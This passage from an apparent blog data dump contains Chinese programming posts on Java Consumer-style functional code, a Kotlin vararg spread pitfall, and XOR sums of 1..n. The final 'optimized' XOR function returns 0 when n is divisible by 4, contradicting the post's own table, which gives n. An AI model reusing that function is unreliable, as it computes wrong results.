class=\"line\"><span class=\"comment\">// build.gradle</span></span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    compileOptions &#123;</span><br><span class=\"line\">        sourceCompatibility JavaVersion.VERSION_1_8</span><br><span class=\"line\">        targetCompatibility JavaVersion.VERSION_1_8</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不过，我们也可以自己复制 <code>java.util.function</code> 包中的代码来实现函数式编程（比如AndroidX的工具包中就单独实现了Consumer接口），具体可参考 <code>androidx.core.util.Consumer</code> 的相关引用。</p>\n<p>对函数式编程支持程度高低的一个重要特征是函数是否作为编程语言的一等公民出现，也就是编程语言是否有内置的结构来表示函数。作为面向对象的编程语言，Java 中使用接口来表示函数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比如Consumer就是一种只接受一个输入，而没有输出的特殊函数</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">Consumer</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(T t)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 为通知构建，创建一个PendingIntent</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> PendingIntent <span class=\"title function_\">createActivityI</span><span class=\"params\">(<span class=\"type\">int</span> type, Consumer&lt;Intent&gt; consumer)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Context</span> <span class=\"variable\">appCtx</span> <span class=\"operator\">=</span> MyApp.getContext(); <span class=\"comment\">// 获取App全局Context</span></span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (consumer != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        consumer.accept(intent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> PendingIntent.getActivity(appCtx, type, intent, PendingIntent.FLAG_UPDATE_CURRENT);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 外部调用</span></span><br><span class=\"line\"><span class=\"type\">PendingIntent</span> <span class=\"variable\">clickI</span> <span class=\"operator\">=</span> createActivityI(INTENT_TYPE_TEST, intent -&gt; &#123;</span><br><span class=\"line\">    intent.setData(xxx);</span><br><span class=\"line\">    intent.putExtra(xxx);</span><br><span class=\"line\">    <span class=\"comment\">// ...对intent对象各种操作，无需关心内部是如何初始化的（实例化），我们只是外部消费者（consumer）</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>上面这段代码可能咋一看跟真正的函数式编程并没有什么卵关系，甚至一般的builder模式也能实现。</p>\n<p>但我们应该把 <strong>intent -&gt; { … }</strong> 看成一个λ函数表达式，intent是唯一参数且<strong>不可变</strong>，并且我们应当遵守纯函数的规范，即 <strong>{ … }</strong> 函数实现内部只对 intent 进行修饰等操作，不应该去做其他无关的事情（比如修改外部变量，甚至是调起其他功能模块等）。</p>\n<p>在消费者 <code>consumer.accept()</code> 的瞬间，内外互不相知干了什么，天然地做到了业务逻辑隔离。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://www.ibm.com/developerworks/cn/java/j-understanding-functional-programming-1\">函数式编程思想概论</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E6%9F%AF%E9%87%8C%E5%8C%96\">柯里化-wiki</a></li>\n<li><a href=\"https://juejin.im/post/5b4ac0d0f265da0fa959a785\">JavaScript 函数式编程</a></li>\n</ul>\n<h2 id=\"请勿滥用\"><a href=\"#请勿滥用\" class=\"headerlink\" title=\"请勿滥用\"></a>请勿滥用</h2><p>越抽象和高级的东西，内部消耗越大，乃自然之理。虽然函数式编程有很多优点，如可读性好，函数无副作用，参数不可变（理论上适合并行操作，不用考虑死锁，实际上性能不够，是不是挺矛盾的？）等。</p>\n<p>但相比指令式编程，大量使用函数式编程，会影响程序性能。不适合做IO密集型操作和一些高性能的UI操作。从Java函数式编程的实现来看，内部也涉及到比较多的函数递归嵌套，给栈区带来一定的压力。</p>\n<p><strong>合理使用：</strong></p>\n<p>平时工作中可以利用函数式编程的理念来简化业务代码，如上文示例，还是蛮好的。</p>\n"},{"layout":"post","title":"Kotlin变长参数的一些小坑","subtitle":"见微知著。","date":"2020-06-11T16:00:00.000Z","author":"YSY","header-img":"img/archive-bg.jpg","catalog":true,"_content":"\n## Java中的变长参数\n\n先来看看Java中的变长参数，很简单，为了后面的对比，我们做进行一个连续的传参：\n\n```java\nimport java.util.Arrays;\n\npublic class TestVarargs {\n    public static void main(String[] args) {\n        test1(\"1\", \"2\");\n    }\n    \n    private static void test1(String... args) {\n        test2(args);\n    }\n\n    private static void test2(Object... args) {\n        System.out.println(Arrays.toString(args));\n        System.out.println(args.length);\n    }\n}\n// 输出结果\n// [1, 2]\n// 2\n```\n\n我们都知道变长参数在Java中实际上是一个数组，所以可以用 `Arrays.toString` 方法。\n\n## Kotlin中变长参数的小坑\n\n但如果把上面代码换成Kotlin呢？（在Kotlin中用 `vararg` 关键字表示变长参数）\n\n```kotlin\nfun main(args: Array<String>) {\n    test1(\"1\", \"2\")\n}\n\nprivate fun test1(vararg args: String) {\n    test2(args)\n}\n\nprivate fun test2(vararg args: Any) {\n    println(args.contentToString())\n    println(\"${args.size}\")\n}\n// 输出结果\n// [[Ljava.lang.String;@65ab7765]\n// 1\n```\n\n什么鬼？明明是2个参数，为什么长度是1呢？定睛一看，`args` 数组里竟然只有一个元素，而且类型是 `String[]`。原来在test1方法中它把args数组当成一个整体传入了test2，所以test2中的args数组的第一个元素就是一个String数组。\n\n**如何解决呢？**实际上只要在test1方法中给传参加上 `*` 就可以了，这个星号在Kotlin变长参数中叫**Spread操作**，可以理解为“打散”、“分散”。代码如下：\n\n```kotlin\nprivate fun test1(vararg args: String) {\n    test2(*args)\n}\n// 最终输出结果\n// [1, 2]\n// 2\n```\n\n这样就和Java中期望的结果一致了。\n\n其实这个问题最关键的并不是忘了加星号，而是方法的参数类型给你设了个陷阱，注意test2方法的参数类型，是Any（等同于Java中的Object），所以在test1传参时，test2可以接受任何类型的参数，因此才把args数组当作了一个整体，而不会把它像Java一样自动分散成变长参数：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200613151226352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n如果我们把test2的方法参数改成String，IDE就会自动提示你需要加星号了：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200613151641906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n这也是初学Kotlin时比较容易犯的错误。\n","source":"_posts/2020-06-12-Kotlin变长参数的一些小坑.md","raw":"---\nlayout:     post\ntitle:      Kotlin变长参数的一些小坑\nsubtitle:   见微知著。\ndate:       2020-06-12\nauthor:     YSY\nheader-img: img/archive-bg.jpg\ncatalog: true\ntags:\n    - Kotlin\n    - Java\n    - Android\n---\n\n## Java中的变长参数\n\n先来看看Java中的变长参数，很简单，为了后面的对比，我们做进行一个连续的传参：\n\n```java\nimport java.util.Arrays;\n\npublic class TestVarargs {\n    public static void main(String[] args) {\n        test1(\"1\", \"2\");\n    }\n    \n    private static void test1(String... args) {\n        test2(args);\n    }\n\n    private static void test2(Object... args) {\n        System.out.println(Arrays.toString(args));\n        System.out.println(args.length);\n    }\n}\n// 输出结果\n// [1, 2]\n// 2\n```\n\n我们都知道变长参数在Java中实际上是一个数组，所以可以用 `Arrays.toString` 方法。\n\n## Kotlin中变长参数的小坑\n\n但如果把上面代码换成Kotlin呢？（在Kotlin中用 `vararg` 关键字表示变长参数）\n\n```kotlin\nfun main(args: Array<String>) {\n    test1(\"1\", \"2\")\n}\n\nprivate fun test1(vararg args: String) {\n    test2(args)\n}\n\nprivate fun test2(vararg args: Any) {\n    println(args.contentToString())\n    println(\"${args.size}\")\n}\n// 输出结果\n// [[Ljava.lang.String;@65ab7765]\n// 1\n```\n\n什么鬼？明明是2个参数，为什么长度是1呢？定睛一看，`args` 数组里竟然只有一个元素，而且类型是 `String[]`。原来在test1方法中它把args数组当成一个整体传入了test2，所以test2中的args数组的第一个元素就是一个String数组。\n\n**如何解决呢？**实际上只要在test1方法中给传参加上 `*` 就可以了，这个星号在Kotlin变长参数中叫**Spread操作**，可以理解为“打散”、“分散”。代码如下：\n\n```kotlin\nprivate fun test1(vararg args: String) {\n    test2(*args)\n}\n// 最终输出结果\n// [1, 2]\n// 2\n```\n\n这样就和Java中期望的结果一致了。\n\n其实这个问题最关键的并不是忘了加星号，而是方法的参数类型给你设了个陷阱，注意test2方法的参数类型，是Any（等同于Java中的Object），所以在test1传参时，test2可以接受任何类型的参数，因此才把args数组当作了一个整体，而不会把它像Java一样自动分散成变长参数：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200613151226352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n如果我们把test2的方法参数改成String，IDE就会自动提示你需要加星号了：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200613151641906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n这也是初学Kotlin时比较容易犯的错误。\n","slug":"Kotlin变长参数的一些小坑","published":1,"updated":"2024-03-25T07:31:25.863Z","comments":1,"photos":[],"link":"","_id":"cluaufh13002ythe6dck77vm3","content":"<h2 id=\"Java中的变长参数\"><a href=\"#Java中的变长参数\" class=\"headerlink\" title=\"Java中的变长参数\"></a>Java中的变长参数</h2><p>先来看看Java中的变长参数，很简单，为了后面的对比，我们做进行一个连续的传参：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.Arrays;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestVarargs</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        test1(<span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">test1</span><span class=\"params\">(String... args)</span> &#123;</span><br><span class=\"line\">        test2(args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">test2</span><span class=\"params\">(Object... args)</span> &#123;</span><br><span class=\"line\">        System.out.println(Arrays.toString(args));</span><br><span class=\"line\">        System.out.println(args.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 输出结果</span></span><br><span class=\"line\"><span class=\"comment\">// [1, 2]</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<p>我们都知道变长参数在Java中实际上是一个数组，所以可以用 <code>Arrays.toString</code> 方法。</p>\n<h2 id=\"Kotlin中变长参数的小坑\"><a href=\"#Kotlin中变长参数的小坑\" class=\"headerlink\" title=\"Kotlin中变长参数的小坑\"></a>Kotlin中变长参数的小坑</h2><p>但如果把上面代码换成Kotlin呢？（在Kotlin中用 <code>vararg</code> 关键字表示变长参数）</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">main</span><span class=\"params\">(args: <span class=\"type\">Array</span>&lt;<span class=\"type\">String</span>&gt;)</span></span> &#123;</span><br><span class=\"line\">    test1(<span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">test1</span><span class=\"params\">(<span class=\"keyword\">vararg</span> args: <span class=\"type\">String</span>)</span></span> &#123;</span><br><span class=\"line\">    test2(args)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">test2</span><span class=\"params\">(<span class=\"keyword\">vararg</span> args: <span class=\"type\">Any</span>)</span></span> &#123;</span><br><span class=\"line\">    println(args.contentToString())</span><br><span class=\"line\">    println(<span class=\"string\">&quot;<span class=\"subst\">$&#123;args.size&#125;</span>&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 输出结果</span></span><br><span class=\"line\"><span class=\"comment\">// [[Ljava.lang.String;@65ab7765]</span></span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>\n\n<p>什么鬼？明明是2个参数，为什么长度是1呢？定睛一看，<code>args</code> 数组里竟然只有一个元素，而且类型是 <code>String[]</code>。原来在test1方法中它把args数组当成一个整体传入了test2，所以test2中的args数组的第一个元素就是一个String数组。</p>\n<p><strong>如何解决呢？</strong>实际上只要在test1方法中给传参加上 <code>*</code> 就可以了，这个星号在Kotlin变长参数中叫<strong>Spread操作</strong>，可以理解为“打散”、“分散”。代码如下：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">test1</span><span class=\"params\">(<span class=\"keyword\">vararg</span> args: <span class=\"type\">String</span>)</span></span> &#123;</span><br><span class=\"line\">    test2(*args)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 最终输出结果</span></span><br><span class=\"line\"><span class=\"comment\">// [1, 2]</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<p>这样就和Java中期望的结果一致了。</p>\n<p>其实这个问题最关键的并不是忘了加星号，而是方法的参数类型给你设了个陷阱，注意test2方法的参数类型，是Any（等同于Java中的Object），所以在test1传参时，test2可以接受任何类型的参数，因此才把args数组当作了一个整体，而不会把它像Java一样自动分散成变长参数：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200613151226352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>如果我们把test2的方法参数改成String，IDE就会自动提示你需要加星号了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200613151641906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>这也是初学Kotlin时比较容易犯的错误。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"Java中的变长参数\"><a href=\"#Java中的变长参数\" class=\"headerlink\" title=\"Java中的变长参数\"></a>Java中的变长参数</h2><p>先来看看Java中的变长参数，很简单，为了后面的对比，我们做进行一个连续的传参：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.Arrays;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestVarargs</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        test1(<span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">test1</span><span class=\"params\">(String... args)</span> &#123;</span><br><span class=\"line\">        test2(args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">test2</span><span class=\"params\">(Object... args)</span> &#123;</span><br><span class=\"line\">        System.out.println(Arrays.toString(args));</span><br><span class=\"line\">        System.out.println(args.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 输出结果</span></span><br><span class=\"line\"><span class=\"comment\">// [1, 2]</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<p>我们都知道变长参数在Java中实际上是一个数组，所以可以用 <code>Arrays.toString</code> 方法。</p>\n<h2 id=\"Kotlin中变长参数的小坑\"><a href=\"#Kotlin中变长参数的小坑\" class=\"headerlink\" title=\"Kotlin中变长参数的小坑\"></a>Kotlin中变长参数的小坑</h2><p>但如果把上面代码换成Kotlin呢？（在Kotlin中用 <code>vararg</code> 关键字表示变长参数）</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">main</span><span class=\"params\">(args: <span class=\"type\">Array</span>&lt;<span class=\"type\">String</span>&gt;)</span></span> &#123;</span><br><span class=\"line\">    test1(<span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">test1</span><span class=\"params\">(<span class=\"keyword\">vararg</span> args: <span class=\"type\">String</span>)</span></span> &#123;</span><br><span class=\"line\">    test2(args)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">test2</span><span class=\"params\">(<span class=\"keyword\">vararg</span> args: <span class=\"type\">Any</span>)</span></span> &#123;</span><br><span class=\"line\">    println(args.contentToString())</span><br><span class=\"line\">    println(<span class=\"string\">&quot;<span class=\"subst\">$&#123;args.size&#125;</span>&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 输出结果</span></span><br><span class=\"line\"><span class=\"comment\">// [[Ljava.lang.String;@65ab7765]</span></span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>\n\n<p>什么鬼？明明是2个参数，为什么长度是1呢？定睛一看，<code>args</code> 数组里竟然只有一个元素，而且类型是 <code>String[]</code>。原来在test1方法中它把args数组当成一个整体传入了test2，所以test2中的args数组的第一个元素就是一个String数组。</p>\n<p><strong>如何解决呢？</strong>实际上只要在test1方法中给传参加上 <code>*</code> 就可以了，这个星号在Kotlin变长参数中叫<strong>Spread操作</strong>，可以理解为“打散”、“分散”。代码如下：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">test1</span><span class=\"params\">(<span class=\"keyword\">vararg</span> args: <span class=\"type\">String</span>)</span></span> &#123;</span><br><span class=\"line\">    test2(*args)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 最终输出结果</span></span><br><span class=\"line\"><span class=\"comment\">// [1, 2]</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<p>这样就和Java中期望的结果一致了。</p>\n<p>其实这个问题最关键的并不是忘了加星号，而是方法的参数类型给你设了个陷阱，注意test2方法的参数类型，是Any（等同于Java中的Object），所以在test1传参时，test2可以接受任何类型的参数，因此才把args数组当作了一个整体，而不会把它像Java一样自动分散成变长参数：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200613151226352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>如果我们把test2的方法参数改成String，IDE就会自动提示你需要加星号了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200613151641906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>这也是初学Kotlin时比较容易犯的错误。</p>\n"},{"layout":"post","title":"等差数列异或和的小规律","subtitle":"后知后觉。","date":"2020-06-26T16:00:00.000Z","author":"YSY","header-img":"img/archive-bg.jpg","catalog":true,"_content":"\n## 背景\n\n异或（xor，运算符号`^`）：按位计算，同0异1，`1 ^ 0 = 1` ，`1 ^ 1 = 0` ，如此。\n\n现定义等差数列 `1, 2, ... , n` 的 **异或和** 为 `f(n) = 1 ^ 2 ^ ... ^ n` ，求f(n)的值。\n\n## 实现\n\n我们很容易想到质朴的实现如下：\n\n```c\nint func(int n) {\n    int xor_sum = 0;\n    for (int i = 1; i <= n; ++i) {\n        xor_sum ^= i;\n    }\n    return xor_sum;\n}\n```\n\n时间复杂度O(n)，空间复杂度此处没有太大必要讨论。\n\n## 通式\n\n联想到等差数列的四则运算都是有求和公式的，那么异或运算有没有呢？直接这么看也看不出来，先输出个十来项看看规律：\n\n```c\nint a[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18};\n// 1 3  0 4 1 7  0 8 1 11  0 12 1 15  0 16 1 19\n```\n\n注释中分别是从第1项到第18项的异或和。这个规律其实非常明显了，抛开前2个结果不看，后面4个为一组，定义为m组，通式如下：\n\n```c\n// n=3, 0   n=7, 0      n=4m-1, 0\n// n=4, 4   n=8, 8      n=4m, 4m\n// n=5, 1   n=9, 1      n=4m+1, 1\n// n=6, 7   n=10, 11    n=4m+2, 4m+3\n```\n\n从n>=3开始，后面的异或和的取值都是固定的常量或者公式求得。优化后实现如下：\n\n```c\nint func(int n) {\n    switch (n) {\n        case 1: return 1;\n        case 2: return 3;\n        default:\n            int r = n % 4;\n            switch (r) {\n                case 0: return r;\n                case 1: return 1;\n                case 2: return (n - 2) + 3;\n                default: return 0;\n            }\n    }\n}\n```\n\n时间复杂度O(1) ，部分代码为了体现公式没有精简，主要操作就是取余。\n\n这样能提升不少性能。\n","source":"_posts/2020-06-27-等差数列异或和的小规律.md","raw":"---\nlayout:     post\ntitle:      等差数列异或和的小规律\nsubtitle:   后知后觉。\ndate:       2020-06-27\nauthor:     YSY\nheader-img: img/archive-bg.jpg\ncatalog: true\ntags:\n    - 算法\n---\n\n## 背景\n\n异或（xor，运算符号`^`）：按位计算，同0异1，`1 ^ 0 = 1` ，`1 ^ 1 = 0` ，如此。\n\n现定义等差数列 `1, 2, ... , n` 的 **异或和** 为 `f(n) = 1 ^ 2 ^ ... ^ n` ，求f(n)的值。\n\n## 实现\n\n我们很容易想到质朴的实现如下：\n\n```c\nint func(int n) {\n    int xor_sum = 0;\n    for (int i = 1; i <= n; ++i) {\n        xor_sum ^= i;\n    }\n    return xor_sum;\n}\n```\n\n时间复杂度O(n)，空间复杂度此处没有太大必要讨论。\n\n## 通式\n\n联想到等差数列的四则运算都是有求和公式的，那么异或运算有没有呢？直接这么看也看不出来，先输出个十来项看看规律：\n\n```c\nint a[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18};\n// 1 3  0 4 1 7  0 8 1 11  0 12 1 15  0 16 1 19\n```\n\n注释中分别是从第1项到第18项的异或和。这个规律其实非常明显了，抛开前2个结果不看，后面4个为一组，定义为m组，通式如下：\n\n```c\n// n=3, 0   n=7, 0      n=4m-1, 0\n// n=4, 4   n=8, 8      n=4m, 4m\n// n=5, 1   n=9, 1      n=4m+1, 1\n// n=6, 7   n=10, 11    n=4m+2, 4m+3\n```\n\n从n>=3开始，后面的异或和的取值都是固定的常量或者公式求得。优化后实现如下：\n\n```c\nint func(int n) {\n    switch (n) {\n        case 1: return 1;\n        case 2: return 3;\n        default:\n            int r = n % 4;\n            switch (r) {\n                case 0: return r;\n                case 1: return 1;\n                case 2: return (n - 2) + 3;\n                default: return 0;\n            }\n    }\n}\n```\n\n时间复杂度O(1) ，部分代码为了体现公式没有精简，主要操作就是取余。\n\n这样能提升不少性能。\n","slug":"等差数列异或和的小规律","published":1,"updated":"2024-03-25T07:31:25.863Z","comments":1,"photos":[],"link":"","_id":"cluaufh140030the6ev7n4bi0","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" 